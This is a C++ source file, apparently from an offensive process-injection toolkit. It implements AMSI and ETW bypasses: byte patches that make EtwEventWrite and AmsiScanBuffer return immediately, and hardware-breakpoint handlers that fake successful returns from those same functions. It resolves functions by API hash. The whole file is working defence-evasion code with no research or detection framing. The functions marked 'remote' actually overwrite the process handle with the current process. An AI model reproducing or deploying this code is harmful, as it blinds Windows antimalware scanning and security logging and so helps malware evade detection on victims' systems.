#include "patch.hpp"

bool patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    unsigned char* k = helperHandler.getNtdll();
    hProcess = GetCurrentProcess();
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    PVOID etwAddress = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!etwAddress) return 1;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
    return 0;
}


bool patchRemoteAmsi(HANDLE hProcess) {
    HMODULE amsiBaseAddr = (HMODULE)mainInjector.findRemoteModule(hProcess, L"amsi.dll");
    if (!amsiBaseAddr) {
        std::cout << "[-] Failed to find amsi.dll in remote process going to load it" << std::endl;
        amsiBaseAddr = LoadLibraryW(L"amsi.dll");
	}
    hProcess = GetCurrentProcess();
    PVOID amsiScanBuffAdr = syscallHandler.getFunctionAddressByHash(L"amsi.dll", 704434574);
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuffAdr << std::endl;

    // Change protection to RW
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_READWRITE, patchSize);

    //Write the patch
    mainInjector.wrMem(hProcess, amsiScanBuffAdr, (LPVOID)patch, patchSize);

    //Restore protection to RX
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] Amsi silenced in remote process." << std::endl;
    return 0;
}

PVOID g_EtwAddr;
void SetupEtwBypass() {
    unsigned char* k = helperHandler.getNtdll();

    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    g_EtwAddr = syscallHandler.getFunctionAddressByHash(wK, 615043106);
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, EtwHwbpHandler);

    
    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_EtwAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);
}

LONG WINAPI EtwHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_EtwAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}



PVOID g_AmsiAddr;
void SetupAMSIBypass() {
    LoadLibraryW(L"amsi.dll");
    g_AmsiAddr = syscallHandler.getFunctionAddressByHash(L"amsi.dll", 704434574);
	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, AmsiHwbpHandler);


    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_AmsiAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);

}
LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_AmsiAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
};